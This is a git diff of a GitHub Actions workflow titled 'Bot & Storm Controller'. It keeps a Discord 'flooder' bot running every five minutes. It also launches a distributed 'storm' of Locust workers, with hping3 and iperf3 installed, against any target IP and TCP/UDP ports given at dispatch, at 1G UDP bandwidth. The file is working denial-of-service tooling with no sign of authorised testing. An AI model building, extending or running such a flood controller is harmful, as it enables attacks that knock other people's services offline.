@@ -1,36 +1,69 @@
-name: 🚀 Deploy Bot & Run Locust+C-Tools (Scheduled)
+# .github/workflows/bot-and-storm.yml
+name: 🤖 Bot & Storm Controller
 
 on:
   schedule:
-    - cron: '*/5 * * * *'
+    - cron: '*/5 * * * *'     # every 5 minutes → will only run deploy_bot
   workflow_dispatch:
+    inputs:
+      action:
+        description: "Action to run"
+        required: true
+        type: choice
+        options:
+          - deploy_bot
+          - run_storm
+      ip:
+        description: "Target IP (for run_storm)"
+        required: false
+      tcp_port:
+        description: "TCP port (for run_storm)"
+        required: false
+      udp_port:
+        description: "UDP port (for run_storm)"
+        required: false
+      users:
+        description: "Locust total users"
+        required: false
+      spawn_rate:
+        description: "Locust spawn rate (users/s)"
+        required: false
+      run_time:
+        description: "Locust run time (e.g. 2m)"
+        required: false
+      workers:
+        description: "Locust worker count"
+        required: false
 
 concurrency:
   group: bot-and-storm
   cancel-in-progress: false
 
 jobs:
-  deploy-and-storm:
-    runs-on: ubuntu-latest
-    timeout-minutes: 60
+  deploy_bot:
+    # run on schedule OR when dispatched with action=deploy_bot
+    if: >
+      github.event_name == 'schedule' ||
+      (github.event_name == 'workflow_dispatch' &&
+       github.event.inputs.action == 'deploy_bot')
+    runs-on: [ self-hosted, ubuntu, x64 ]
+    timeout-minutes: 15
 
     steps:
       - name: 📥 Checkout code
         uses: actions/checkout@v3
 
       - name: ⚙️ Install system deps
-        run: |
-          sudo apt-get update
-          sudo apt-get install -y hping3 iperf3 python3-venv
+        run: sudo apt-get update && sudo apt-get install -y hping3 iperf3 python3-venv
 
-      - name: 🔨 Setup Python venv & install deps
+      - name: 🔨 Setup Python & deps
         run: |
           python3 -m venv .venv
           . .venv/bin/activate
           pip install --upgrade pip
           pip install discord.py locust
 
-      - name: 🚀 Launch Discord Flooder Bot
+      - name: 🚀 Launch/Restart Bot
         run: |
           pkill -f "python bot.py" || true
           nohup bash -lc '
@@ -40,21 +73,53 @@ jobs:
             python bot.py
           ' > bot.log 2>&1 &
 
-      - name: ⏱️ Give bot a moment to connect
-        run: sleep 5
+  run_storm:
+    # only when dispatched with action=run_storm
+    if: >
+      github.event_name == 'workflow_dispatch' &&
+      github.event.inputs.action == 'run_storm'
+    runs-on: [ self-hosted, ubuntu, x64 ]
+    timeout-minutes: 30
 
-      - name: 🔥 Run distributed Locust+C-Tools storm
+    steps:
+      - name: 📥 Checkout code
+        uses: actions/checkout@v3
+
+      - name: ⚙️ Install system deps
+        run: sudo apt-get update && sudo apt-get install -y hping3 iperf3 python3-venv
+
+      - name: 🔨 Setup Python & deps
+        run: |
+          python3 -m venv .venv
+          . .venv/bin/activate
+          pip install --upgrade pip
+          pip install locust
+
+      - name: 🔥 Run Locust+C-Tools Storm
+        env:
+          LOCUST_TARGET_IP: ${{ github.event.inputs.ip }}
+          LOCUST_TCP_PORT:  ${{ github.event.inputs.tcp_port }}
+          LOCUST_UDP_PORT:  ${{ github.event.inputs.udp_port }}
+          LOCUST_UDP_BW:    "1G"
         run: |
           . .venv/bin/activate
-          locust -f locustfile_tools.py \
-            --master --expect-workers 20 --headless \
-            --users 200 --spawn-rate 20 --run-time 2m &
-          MASTER_PID=$!
-          sleep 5
-          for i in $(seq 1 20); do
-            locust -f locustfile_tools.py --worker --master-host=127.0.0.1 &
-          done
-          wait $MASTER_PID
 
-      - name: ✅ All done
-        run: echo "Bot is live and storm completed."
+          # master
+          locust -f locustfile_tools.py \
+            --master \
+            --expect-workers ${{ github.event.inputs.workers || 4 }} \
+            --headless \
+            --users ${{ github.event.inputs.users || 200 }} \
+            --spawn-rate ${{ github.event.inputs.spawn_rate || 20 }} \
+            --run-time ${{ github.event.inputs.run_time || '2m' }} &
+          MASTER_PID=$!
+
+          sleep 5
+
+          # workers
+          for i in $(seq 1 ${{ github.event.inputs.workers || 4 }}); do
+            locust -f locustfile_tools.py \
+              --worker --master-host=127.0.0.1 &
+          done
+
+          wait $MASTER_PID
